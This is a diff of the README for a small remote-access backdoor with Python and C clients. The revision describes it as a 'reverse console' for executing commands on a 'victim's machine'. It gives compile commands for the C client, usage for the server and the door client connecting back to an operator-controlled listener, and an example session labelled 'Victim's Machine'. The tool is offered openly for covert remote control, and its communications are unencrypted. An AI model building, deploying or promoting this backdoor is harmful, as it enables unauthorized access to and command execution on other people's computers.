@@ -1,6 +1,8 @@
-> A simple Backdoor CONSOLE, Support both Python 2 & 3.
-
+> A Tiny REVERSE CONSOLE that allows you excute command on victim's machine.
+>
+> Python version Support both Python 2 & 3, no thirdpart dependencies.
 > There is also a C version client side program Support Linux & Windows.
+> WARN: (Server <=> Client communications not encrypted)
 
 ### Compile C version `door.c`
 ```
@@ -10,7 +12,7 @@ $> cl door.c /O1 /D WIN32 /Fe door /link /subsystem:console
 $> gcc -Wall -O1 door.c -o door
 ```
 
-### Command Line Argument
+### How To Use?
 ```
 $> ./server.py bind_address:bind_port
 $> ./door.py server_ip:server_port[:retry_interval]
@@ -18,12 +20,13 @@ $> ./door.py server_ip:server_port[:retry_interval]
 # Server Example
 $> ./server.py 127.0.0.1:4433
 
-# Client Example
-$> ./door.py 127.0.0.1:4433 # default retry interval 16
+# Client Example (C version has the same usage)
+$> ./door.py 127.0.0.1:4433 # default retry interval 60 seconds
 $> ./door.py 127.0.0.1:4433:60
 ```
 
-### Your side
+## Example
+#### Your Machine
 ```
 root@server 07:47 /home # ./server 0.0.0.0:2345
 listen on 0.0.0.0:2345, waiting for connection.
@@ -41,7 +44,7 @@ drwxr-xr-x  5 git  git  4096 Jan  3 08:41 jack
 $>
 ```
 
-### Jack's
+#### Victim's Machine
 ```
 root@boy 07:47 /home # ./door *.*.*.*:2345
 ```
